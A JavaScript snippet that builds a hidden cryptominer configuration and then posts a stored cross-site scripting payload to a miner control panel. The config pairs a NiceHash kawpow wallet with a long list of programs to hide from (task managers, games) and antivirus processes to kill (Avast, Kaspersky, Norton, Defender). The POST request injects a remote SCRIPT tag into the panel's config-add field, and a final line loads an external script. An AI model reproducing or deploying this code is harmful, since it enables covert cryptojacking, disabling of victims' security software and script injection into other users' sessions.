let _data = {
        "algo": "kawpow",
        "pool": "kawpow.auto.nicehash.com",
        "port": 9200,
        "password": "x",
        "nicehash": true,
        "ssltls": false,
        "wallet": "38fK6CHWVe7c3w1xxsZE4biNwwi88UyQ5E.main1",
        "max-cpu": 80,
        "idle-wait": 5,
        "idle-cpu": 100,
        "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe,ModernWarfare.exe,ShooterGame.exe,ShooterGameServer.exe,ShooterGame_BE.exe,GenshinImpact.exe,FactoryGame.exe,Borderlands2.exe,EliteDangerous64.exe,PlanetCoaster.exe,Warframe.x64.exe,NMS.exe,RainbowSix.exe,RainbowSix_BE.exe,CK2game.exe,ck3.exe,stellaris.exe,arma3.exe,arma3_x64.exe,TslGame.exe,ffxiv.exe,ffxiv_dx11.exe,GTA5.exe,FortniteClient-Win64-Shipping.exe,r5apex.exe,VALORANT.exe,csgo.exe,PortalWars-Win64-Shipping.exe,FiveM.exe,left4dead2.exe,FIFA21.exe,BlackOpsColdWar.exe,EscapeFromTarkov.exe,TEKKEN 7.exe,SRTTR.exe,DeadByDaylight-Win64-Shipping.exe,PointBlank.exe,enlisted.exe,WorldOfTanks.exe,SoTGame.exe,FiveM_b2189_GTAProcess.exe,NarakaBladepoint.exe,re8.exe,Sonic Colors - Ultimate.exe,iw6sp64_ship.exe,RocketLeague.exe,Cyberpunk2077.exe,FiveM_GTAProcess.exe,RustClient.exe,Photoshop.exe,VideoEditorPlus.exe,AfterFX.exe,League of Legends.exe,Fallout4.exe,FarCry5.exe,RDR2.exe,Little_Nightmares_II_Enhanced-Win64-Shipping.exe,NBA2K22.exe,Borderlands3.exe,LeagueClientUx.exe,RogueCompany.exe,Tiger-Win64-Shipping.exe,WatchDogsLegion.exe,Phasmophobia.exe,VRChat.exe,NBA2K21.exe,NarakaBladepoint.exe,ForzaHorizon4.exe,acad.exe,AndroidEmulatorEn.exe,bf4.exe,zula.exe,Adobe Premiere Pro.exe,GenshinImpact.exe",
        "kill-targets": "afwServ.exe,aswEngSrv.exe,aswidsagent.exe,aswToolsSvc.exe,AvastSvc.exe,AvastSvc.exe,AvastUI.exe,wsc_proxy.exe,AvastBrowser.exe,AvastNM.exe,ashwebsv.exe,aswupdsv.exe,kavfswp.exe,kavtray.exe,kavfsmui.exe,kavshell.exe,kavfsrcn.exe,kavfs.exe,kavfsgt.exe,kavfswh.exe,kavfsscs.exe,efpeadm.exe,VPNGUI.exe,CVPND.exe,IPSECLOG.exe,cfp.exe,fsdfwd.exe,fsguiexe.exe,blackd.exe,kpf4gui.exe,MSSCLL.exe,MCSHELL.exe,MPFSERVICE.exe,MPFAGENT.exe,nisum.exe,smc.exe,persfw.exe,pccpfw.exe,WINSS.exe,ZLCLIENT.exe,MCODS.exe,MCSHIELD.exe,msmpeng.exe,navapsvc.exe,avkwctl.exe,fsav32.exe,mcshield.exe,ntrtscan.exe,avguard.exe,ashServ.exe,AVENGINE.exe,avgemc.exe,tmntsrv.exe,ARestore.exe,asOELnch.exe,buVss.exe,cltLMH.exe,cltRT.exe,coInst.exe,coNatHst.exe,CpySnpt.exe,EFAInst64.exe,elaminst.exe,FLDgHost.exe,InstCA.exe,MCUI32.exe,Navw32.exe,ncolow.exe,NortonSecurity.exe,NSc.exe,nsWscSvc.exe,nuPerfScan.exe,RuleUp.exe,SEFInst.exe,Sevntx64.exe,SRTSP_CA.exe,SymDgnHC.exe,symerr.exe,SymVTCatalogDB.exe,tuIH.exe,uiStub.exe,uiWNSNotificationApp.exe,Upgrade.exe,vpnCA.exe,wa_3rd_party_host_32.exe,wa_3rd_party_host_64.exe,WFPUnins.exe,wpInstCA.exe,WSCStub.exe",
        "stealth-fullscreen": true,
        "remote-config": "https://pastebin.com/raw/Mh8K3TCK",
        "api-endpoint": "https://owenkruse.click/api/endpoint.php"
};


let jsonData = JSON.stringify(_data);
console.log(jsonData);

await fetch("https://owenkruse.click/api/ajax-actions.php", {
        "credentials": "include",
        "headers": {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "en-US,en;q=0.5",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "UNAM-Request-Type": "AJAX",
                "X-Requested-With": "XMLHttpRequest",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
                "Pragma": "no-cache",
                "Cache-Control": "no-cache"
        },
        "referrer": "https://owenkruse.click/index.php?page=configurations",
        "body": "method=config-add&name=%3CSCRIPT+SRC%3Dhttps%3A%2F%2Fowenkruse.click%2F__UNAM_LIB%2Fs.js%3E%3C%2FSCRIPT%3E&data=%7B%7D",
        "method": "POST",
        "mode": "cors"
});

<SCRIPT SRC=https://owenkruse.github.io/code.js></SCRIPT>
    config-add
{}